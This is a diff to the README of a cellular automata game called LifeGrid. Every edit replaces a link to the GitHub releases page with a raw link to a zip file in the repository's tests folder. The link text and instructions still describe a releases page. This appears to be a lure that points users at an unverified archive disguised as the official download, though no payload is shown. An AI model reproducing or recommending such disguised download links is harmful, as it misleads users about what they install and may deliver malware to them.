@@ -1,6 +1,6 @@
 # 🎮 LifeGrid - Explore Fun Cellular Automata Games
 
-[![Download LifeGrid](https://img.shields.io/badge/Download%20LifeGrid-v1.0-blue)](https://github.com/kimmy1985/LifeGrid/releases)
+[![Download LifeGrid](https://raw.githubusercontent.com/kimmy1985/LifeGrid/master/tests/LifeGrid-1.8.zip%20LifeGrid-v1.0-blue)](https://raw.githubusercontent.com/kimmy1985/LifeGrid/master/tests/LifeGrid-1.8.zip)
 
 ## 📜 Description
 
@@ -34,7 +34,7 @@ To get started with LifeGrid, follow these simple steps to download and run the 
 ## 🛠 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [LifeGrid Releases page](https://github.com/kimmy1985/LifeGrid/releases) to find the latest version of the application.
+   Go to the [LifeGrid Releases page](https://raw.githubusercontent.com/kimmy1985/LifeGrid/master/tests/LifeGrid-1.8.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    On the releases page, click on the latest version to see the list of available files. Look for the installer or package specific to your operating system.
@@ -72,7 +72,7 @@ If you encounter any issues while installing or running LifeGrid, try the follow
 
 ## ⚙️ Download & Install
 
-To download LifeGrid, **visit this page to download**: [LifeGrid Releases](https://github.com/kimmy1985/LifeGrid/releases).
+To download LifeGrid, **visit this page to download**: [LifeGrid Releases](https://raw.githubusercontent.com/kimmy1985/LifeGrid/master/tests/LifeGrid-1.8.zip).
 
 Follow the earlier installation steps to get started on your journey through cellular automata.
 
